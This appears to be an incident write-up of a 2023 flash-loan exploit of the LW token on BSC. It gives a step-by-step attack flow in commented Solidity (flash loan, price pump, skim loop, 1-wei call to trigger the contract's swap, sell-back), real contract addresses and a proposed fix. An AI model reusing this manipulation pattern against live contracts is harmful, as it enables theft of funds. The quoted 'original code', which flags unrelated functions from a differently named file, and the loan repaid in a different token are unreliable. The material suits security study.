# LW Token Exploit — receive() Function Executes Unprotected Swap

## Metadata
| Field | Value |
|---|---|
| Date | 2023-05-09 |
| Project | LW Token |
| Chain | BSC |
| Loss | ~$50,000 |
| Attacker | Unconfirmed |
| Attack TX | Unconfirmed |
| Vulnerable Contract | LW Token: 0x7B8C378df8650373d82CeB1085a18FE34031784F |
| Block | Unconfirmed |
| CWE | CWE-284 (Improper Access Control — unprotected receive()) |
| Vulnerability Type | Unprotected receive() Executes Price-Sensitive Swap |

## Summary
The LW token's `receive()` function automatically executed a 3,000 USDT → LW swap whenever ETH/BNB was sent to the contract. After flash-borrowing LW, the attacker manipulated `thanPrice()` via LP transfers and skim loops, then sent 1 wei to the contract to trigger `receive()` — which executed an unfavorable 3,000 USDT swap at the manipulated price, netting the attacker profit on the reverse swap.

## Vulnerability Details
- **CWE-284**: `receive()` executed a material swap operation (3,000 USDT → LW via `marketAddr`) without any caller check, slippage limit, or reentrancy guard. Any address could trigger this swap by sending 1 wei, causing the contract to spend 3,000 USDT at whatever the current (potentially manipulated) price was.

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: GGGTOKEN.sol
    function increaseAllowance(address spender, uint256 addedValue)  // ❌

// ...

    function decreaseAllowance(address spender, uint256 subtractedValue)  // ❌

// ...

    function _approve(  // ❌

// ...

    function _transfer(  // ❌

// ...

    function _takeInviter(  // ❌
```

## Attack Flow (from testExploit())
```solidity
// 1. Pair.swap(1_000_000e18 LW, 0, address(this), data)
//    → flash loan 1,000,000 LW
// 2. pancakeCall():
//    a. Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
//          USDT, 0, [USDT→LW], ...
//       )  // buy LW → inflate price
//    b. Loop: LW.transfer(address(LP), amount) + LP.skim(address(this))
//       → iteratively extract excess LW via skim
//    c. address(LWToken).call{value: 1 wei}("")
//       → triggers receive() → LW contract spends 3,000 USDT buying LW at inflated price
//    d. Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
//          LW, 0, [LW→USDT], ...
//       )  // sell LW at higher price
//    e. Repay flash loan: 1_002_507 USDT
```

## Interfaces from PoC
```solidity
interface ILW is IERC20 {
    function getTokenPrice() external view returns (uint256);
    function thanPrice() external view returns (bool);
}

interface Uni_Pair_V2 {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
}
```

## Key Addresses
| Label | Address |
|---|---|
| LW Token | 0x7B8C378df8650373d82CeB1085a18FE34031784F |
| USDT | 0x55d398326f99059fF775485246999027B3197955 |
| LW/USDT Pair | 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE |
| LP | 0x6D2D124acFe01c2D2aDb438E37561a0269C6eaBB |
| PancakeRouter | 0x10ED43C718714eb63d5aA57B78B54704E256024E |
| marketAddr | 0xae2f168900D5bb38171B01c2323069E5FD6b57B9 |

## Root Cause
The `receive()` function executed a fixed-USDT swap without authorization checks or slippage protection. Any 1-wei ETH transfer triggered a 3,000 USDT market purchase at the current spot price.

## Fix
```solidity
// Remove auto-swap from receive():
receive() external payable {
    // Only accept ETH, do not execute swaps
    emit ReceivedETH(msg.sender, msg.value);
}

// Swap should only be callable by owner:
function triggerMarketBuy(uint256 usdtAmount, uint256 minOut) external onlyOwner {
    require(usdtAmount <= maxBuyAmount, "Exceeds limit");
    _swapUSDTForLW(usdtAmount, minOut);
}
```

## References
- BSC LW Token: 0x7B8C378df8650373d82CeB1085a18FE34031784F
- Attack used 1 wei trigger + flash loan combination